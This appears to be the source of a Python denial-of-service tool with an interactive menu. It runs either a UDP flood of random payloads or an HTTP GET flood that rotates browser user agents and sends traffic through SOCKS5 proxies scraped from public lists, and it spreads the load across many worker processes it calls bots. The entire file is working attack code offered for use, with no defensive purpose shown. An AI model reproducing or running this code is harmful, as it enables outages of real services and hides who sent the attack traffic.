import os
import sys
import socket
import time
import multiprocessing
import random
import requests
import t
import an

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:122.0) Gecko/20100101 Firefox/122.0"
]

def parse_size(size_str):
    size_str = size_str.lower().strip()
    try:
        if 'kb' in size_str: return int(size_str.replace('kb','')) * 1024
        if 'mb' in size_str: return int(size_str.replace('mb','')) * 1024 * 1024
        return int(size_str)
    except: return 1024

def get_proxies():
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
    ]
    all_proxies = []
    for url in urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200: all_proxies.extend(r.text.splitlines())
        except: continue
    return list(set(all_proxies))

def bot_worker(target, method, limit, shared_counter, running_flag, p_size, proxies):
    local_c = 0
    if method == "1":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip, port = (target.split(":")[0], int(target.split(":")[1])) if ":" in target else (target, 80)
        payload = os.urandom(p_size)
        while running_flag.value:
            try:
                s.sendto(payload, (ip, port))
                local_c += 1
                if local_c >= 50:
                    with shared_counter.get_lock(): shared_counter.value += local_c
                    if limit > 0 and shared_counter.value >= limit: running_flag.value = False; break
                    local_c = 0
            except: continue
    else:
        url = target if target.startswith("http") else f"http://{target}"
        while running_flag.value:
            try:
                ua = random.choice(USER_AGENTS)
                proxy = random.choice(proxies) if proxies else None
                px = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"} if proxy else None
                requests.get(url, headers={"User-Agent": ua}, proxies=px, timeout=2)
                local_c += 1
                if local_c >= 5:
                    with shared_counter.get_lock(): shared_counter.value += local_c
                    if limit > 0 and shared_counter.value >= limit: running_flag.value = False; break
                    local_c = 0
            except: continue

def start_attack():
    L = t.STRINGS[t.CONF["lang"]]
    an.print_ui([L["setup"]])
    target = input(an.apply_color(f"   {L['target']}"))
    method = input(an.apply_color(f"   {L['meth']}"))
    p_size = parse_size(input(an.apply_color(f"   {L['psize']}")))
    try: timer_val = int(input(an.apply_color(f"   {L['timer']}")) or 0)
    except: timer_val = 0
    try: limit = int(input(an.apply_color(f"   {L['limit']}")) or 0)
    except: limit = 0
    try: bot_count = int(input(an.apply_color(f"   {L['threads']} -> ")) or t.CONF["botnet_size"])
    except: bot_count = t.CONF["botnet_size"]

    shared_counter = multiprocessing.Value('q', 0)
    running_flag = multiprocessing.Value('b', True)
    proxies = get_proxies() if method == "2" else []
    
    bots = []
    for _ in range(bot_count):
        p = multiprocessing.Process(target=bot_worker, args=(target, method, limit, shared_counter, running_flag, p_size, proxies))
        p.daemon = True; p.start(); bots.append(p)

    start_time = time.perf_counter()
    try:
        while running_flag.value:
            cur = shared_counter.value
            dur = time.perf_counter() - start_time
            if timer_val > 0 and dur >= timer_val: running_flag.value = False; break
            pbar = an.draw_bar(dur, timer_val)
            stats = f"BOTS: {bot_count} | SENT: {cur} | PPS: {cur/dur:.0f} | {pbar}"
            sys.stdout.write('\r' + an.apply_color(stats.center(an.get_size()[0])))
            sys.stdout.flush()
            time.sleep(0.1)
    except KeyboardInterrupt: running_flag.value = False

    for p in bots: p.terminate()
    print("\n\n" + an.apply_color(L["finished"].center(an.get_size()[0])))
    time.sleep(1.5)
      
